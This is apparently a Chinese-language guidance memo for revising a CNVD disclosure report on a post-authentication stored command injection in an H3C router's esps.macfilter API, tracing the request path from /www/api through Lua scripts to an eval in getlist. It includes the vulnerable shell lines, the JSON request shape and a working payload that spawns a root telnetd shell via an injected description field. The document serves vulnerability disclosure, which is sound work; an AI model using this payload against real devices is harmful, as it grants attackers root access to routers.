# `esps.macfilter.add -> getlist` 存储型 root RCE 分析指导与正式稿修改建议

## 1. 用途

这份文档是给当前 CNVD 提交版正式报告配套使用的分析指导稿，目标有三件事：

1. 把漏洞原理讲得更严格；
2. 指出当前正式稿还可以补强的点；
3. 给出建议加入正式稿的验证内容和表述模板。

对应正式稿：

- `report/17_postauth_esps_macfilter_getlist_rce_report.md`

---

## 2. 当前正式稿的总体评价

这版正式稿的主结论没有问题，核心定性也是对的：

- 这是 `POST /api/esps`
- 对象是 `esps.macfilter`
- 方法链是 `add -> getlist`
- 字段是 `description`
- 类型是 post-auth stored root RCE

但如果按“提交材料经得住复核”的标准看，还可以继续补强四个点：

1. `/www/api` 这一层现在写得偏概括，建议补成二进制可验证链路；
2. 根因分析缺少精确文件行号和执行点/回显点区分；
3. 动态验证部分还不够“证据化”，比如没有明确写出空 `description` 的意义；
4. payload 示例写法略含糊，建议换成更标准的 `$(...)` 示例。

---

## 3. 最应该先纠正的一点：`/www/api` 这层的描述

当前正式稿在第 5 节中写道：

- `/www/api`：Web API 二进制，负责处理认证后的 `/api/esps` 请求并转发 ubus 对象调用。

这句话方向没错，但还不够精确。更准确的表述应该是：

1. `/www/api` 主循环根据 `PATH_INFO` 判断请求路径；
2. 当路径以 `/esps` 开头时，进入 `FCGI_EspsProcess`；
3. `FCGI_EspsProcess` 读取 HTTP body，并拼接命令：

```text
lua /usr/lib/lua/protol_cvt.lua magic_link '<request-body>'
```

4. 随后通过 `popen` 执行上述 Lua 协议转换脚本；
5. `protol_cvt.lua` 再调用 `magic_link` 模块，把 JSON 数组中的 `object` / `method` / `param` 映射为 ubus `path` / `func` / `args`；
6. 最终由 Lua 层 `ubus.connect()` 和 `conn:call(...)` 发起真正的 ubus 调用；
7. 当 `object = esps.macfilter` 时，落到后端脚本 `/usr/libexec/rpcd/esps.macfilter`。

也就是说，`/www/api` 不是一句“直接转发到 ubus”就能说清的，它中间还有：

```text
/www/api
  -> FCGI_EspsProcess
  -> lua /usr/lib/lua/protol_cvt.lua magic_link '<body>'
  -> magic_link.lua
  -> ubus call
  -> rpcd/esps.macfilter
```

这个链路写得越精确，报告的可信度越高。

---

## 4. `/www/api` 侧可直接引用的静态证据

下面这些都是当前可以直接在正式稿里引用的证据。

### 4.1 主分发函数 `main`

IDA 中 `main` 的关键点：

- `0x402014`：读取 `PATH_INFO`
- `0x402380`：读取 `HTTP_AUTHENTICATION`
- `0x402394`：调用 `FCGI_UserAuth(...)`
- `0x4024f0`：判断 `PATH_INFO` 是否以 `"/esps"` 开头
- `0x402504`：命中后调用 `FCGI_EspsProcess(...)`

这说明：

- `/esps` 路由位于认证检查之后；
- `AUTHENTICATION` 头在 `/www/api` 内被读取并交给认证逻辑；
- 因此当前链路明确属于 post-auth。

### 4.2 `FCGI_EspsProcess`

IDA 中 `FCGI_EspsProcess` 的关键点：

- `0x404eb4`：读取 `CONTENT_LENGTH`
- `0x405078`：读取 HTTP body
- `0x4050dc`：构造命令

```text
lua %s %s '%s'
```

对应参数为：

- `/usr/lib/lua/protol_cvt.lua`
- `magic_link`
- 原始请求体

- `0x405424`：通过 `FCGI_popen(...)` 执行该命令

这说明 `/api/esps` 的请求体不是由 C 代码直接解析成 ubus 调用，而是先交给 Lua 协议转换脚本。

### 4.3 `protol_cvt.lua`

固件路径：

- `Identify_Material/H3C/NX15V100R017/rootfs/usr/lib/lua/protol_cvt.lua`

关键行：

- `9-11`：读取 `proto`、`method`、`para`
- `38-41`：拼接 Lua 模块路径并 `require(proto)`
- `50-56`：`magic_link` 模式下直接解码请求 JSON
- `77`：`local ubuscmd = methodObj.find_ubus_cmd(method_para_info)`
- `89`：`local conn = ubus.connect()`
- `117`：`data.result = conn:call(v.path, v.func, v.args)`

这说明 Lua 层负责把请求内容翻译成 ubus 调用。

### 4.4 `magic_link.lua`

固件路径：

- `Identify_Material/H3C/NX15V100R017/rootfs/usr/lib/lua/magic_link/magic_link.lua`

关键行：

- `12-25`：遍历输入数组 `para`
- `18` / `25`：把
  - `v.object` 映射为 ubus `path`
  - `v.method` 映射为 ubus `func`
  - `v.param` 映射为 ubus `args`

这正好解释了为什么 PoC 里提交：

```json
{"object":"esps.macfilter","method":"getlist","param":{}}
```

最终会变成对 ubus 对象 `esps.macfilter` 的 `getlist` 调用。

---

## 5. 漏洞核心原理

这条链的本质不是 "`add` 当场执行"，
而是：

```text
add 写入恶意 description
  -> 落盘到 UCI
  -> 后续 getlist 读取 UCI
  -> eval 重新解释 description
  -> $(...) 被执行
```

因此它应被稳定表述为：

- stored command injection
- stored root RCE
- trigger point in `getlist`

而不是 write-time immediate RCE。

---

## 6. `esps.macfilter` 侧建议写入正式稿的精确静态证据

目标脚本：

- `Identify_Material/H3C/NX15V100R017/rootfs/usr/libexec/rpcd/esps.macfilter`

### 6.1 写入阶段

`add)` 分支关键位置：

- `364-365`：读取 `mac` 和 `description`
- `379`：`code=$(macfilter_additem "${_mac}" "${_description}")`

`macfilter_additem()` 关键位置：

- `195`：

```sh
uci set webrestriction.macbind_"${_id}".description="${description}"
```

结论：

- 用户可控的 `description` 被原样写入 UCI；
- 没有严格禁止 shell 元字符。

### 6.2 触发阶段

`macfilter_getAllitem()` 中：

- `61-63`
- `75-77`
- `88-90`

核心语句：

```sh
eval webrestriction_remark_list"${idx}"="$(uci get webrestriction."$1".description)"
```

这是真正的执行点。正式稿里建议明确写：

- “命令执行发生在 `macfilter_getAllitem()` 的 `eval` 赋值阶段”

不要只写“读取时触发”，要把 `eval` 点明。

### 6.3 回显阶段

`getlist)` 分支：

- `553-559`：遍历配置项
- `573-575`：把变量写回 JSON

```sh
json_add_int "id" "$(eval echo '$'webrestriction_id_list"${i}")"
json_add_string "description" "$(eval echo '$'webrestriction_remark_list"${i}")"
json_add_string "mac" "$(eval echo '$'webrestriction_mac_list"${i}")"
```

这里属于回显阶段，不是主执行点。

这点最好在正式稿里专门区分：

- `eval webrestriction_remark_list...=...` 是执行点；
- `json_add_string "description" ...` 是把处理后的值返回给前端。

---

## 7. 为什么 `description` 可能变成空字符串

这点建议在正式稿里单独加一小段解释。

如果攻击者存入：

```sh
$(touch /tmp/pwned)
```

则在 `getlist` 中：

```sh
eval webrestriction_remark_list1="$(uci get webrestriction.macbind_1.description)"
```

会被重新解释为：

```sh
webrestriction_remark_list1=$(touch /tmp/pwned)
```

命令确实执行了，但 `touch` 没有标准输出，因此变量值最终为空。

所以如果 `getlist` 的返回里出现：

```json
"description":""
```

这不是失败现象，反而与“命令已执行、但无 stdout”高度一致。

当前正式稿没有把这一点讲出来，建议补上。

---

## 8. 当前正式稿建议修改的具体点

这里按当前报告内容给出更直接的修改意见。

### 8.1 第 5 节 `/www/api` 的描述建议改写

当前版本：

- “负责处理认证后的 `/api/esps` 请求并转发 ubus 对象调用”

建议改成：

- “`/www/api` 在认证通过后根据 `PATH_INFO=/esps` 进入 `FCGI_EspsProcess`，随后将 HTTP 请求体拼接为 `lua /usr/lib/lua/protol_cvt.lua magic_link '<body>'` 并执行，由 Lua 层将 `object` / `method` / `param` 翻译为 ubus `path` / `func` / `args`，最终调用后端对象 `esps.macfilter`。”

这样更准确。

### 8.2 第 4 节建议补精确行号

当前根因分析已经有代码片段，但还不够“可审计”。

建议至少补上：

- `esps.macfilter` `add)`：`364-365`, `379`
- `macfilter_additem()`：`195`
- `macfilter_getAllitem()`：`61-63`, `75-77`, `88-90`
- `getlist)` 输出：`573-575`

### 8.3 第 6 节 payload 示例建议改写

当前正式稿里用了：

```text
"description": "$(<command>)"
```

这个写法容易让人误读。建议改成下面两种之一。

#### 方案 A：抽象写法

```text
"description": "$(COMMAND)"
```

#### 方案 B：直接用真实验证 payload

```text
"description": "$(echo${IFS}MACFILTER_RCE_OK>/tmp/macfilter_rce_marker&&/usr/sbin/telnetd${IFS}-p${IFS}2323${IFS}-l${IFS}/bin/sh)"
```

如果是正式提交稿，我更建议方案 A 放正文，方案 B 放验证章节或附件说明。

### 8.4 第 7 节验证结果建议补“空 description”现象

当前只写了：

- 写入成功
- `getlist` 触发
- root shell 成功

建议再补一个现象级证据：

- `getlist` 返回中，对应恶意项的 `description` 为空字符串

同时补一句解释：

- “该现象符合命令替换已执行且无 stdout 的行为，不代表利用失败。”

### 8.5 第 7 节建议补 marker 文件证明

建议把 root 证明从“只看到 `uid=0(root)`”提升到“双证据”：

1. `uid=0(root)`
2. `/tmp/macfilter_rce_marker` 存在且内容正确

这会比单纯端口连通更扎实。

---

## 9. 建议正式稿增加的验证内容

### 9.1 登录和 session 证明

建议明确写：

- 先通过 `/api/login/auth` 获取 session；
- 后续对 `/api/esps` 的请求头中使用：

```text
AUTHENTICATION: <session>
```

这能把 post-auth 边界钉死。

### 9.2 `getlist` 返回样例

建议加入类似结果：

```json
{"id":2,"description":"","mac":"02:AA:BB:CC:EE:6B"}
```

并解释为什么 `description` 为空。

### 9.3 root 证明

建议最少保留以下命令输出：

```sh
id
uname -a
cat /tmp/macfilter_rce_marker
```

### 9.4 cleanup

建议明确保留：

- `delbymac` 删除恶意条目
- 关闭临时 `telnetd`
- 删除 marker 文件

这是正式稿常见但很加分的部分。

---

## 10. 可直接吸收进正式稿的表述

### 10.1 关于 `/www/api` 到后端对象的链路

> `/www/api` 在认证通过后，根据 `PATH_INFO` 将 `/esps` 请求分派给 `FCGI_EspsProcess`。该函数读取 HTTP 请求体后，拼接并执行 `lua /usr/lib/lua/protol_cvt.lua magic_link '<body>'`。随后 Lua 层通过 `magic_link.lua` 将请求中的 `object`、`method`、`param` 映射为 ubus 的 `path`、`func`、`args`，最终调用后端对象 `esps.macfilter`。

### 10.2 关于 stored RCE 的根因

> `esps.macfilter.add` 在接收 `description` 后，将其未经危险字符过滤直接写入 UCI 配置项 `webrestriction.macbind_<id>.description`。后续 `esps.macfilter.getlist` 在遍历配置项时，通过 `eval webrestriction_remark_list<idx>="$(uci get ...description)"` 重新解释该字段内容。当攻击者预先写入的 `description` 为 `$(...)` 形式时，命令替换会在 `getlist` 读取阶段被执行，从而形成一条 `add -> storage -> getlist -> eval` 的存储型命令执行链。

### 10.3 关于空 `description`

> 利用成功后，接口返回中的 `description` 字段可能为空字符串。这是因为恶意 `$(...)` 已在 `eval` 阶段被命令替换并执行，而此类命令通常不产生标准输出，导致对应 shell 变量最终为空值。该现象不代表利用失败，反而与命令已被消费执行的行为一致。

---

## 11. 这版正式稿如果只改最关键的三处，优先顺序建议如下

1. 先改第 5 节，把 `/www/api -> protol_cvt.lua -> magic_link.lua -> ubus -> esps.macfilter` 链路写准；
2. 再改第 4 节，补 `esps.macfilter` 精确行号和执行点/回显点区分；
3. 最后改第 7 节，补空 `description` 现象、marker 证明和 cleanup。

这样改完以后，这份 CNVD 提交版就比当前版本更硬了。
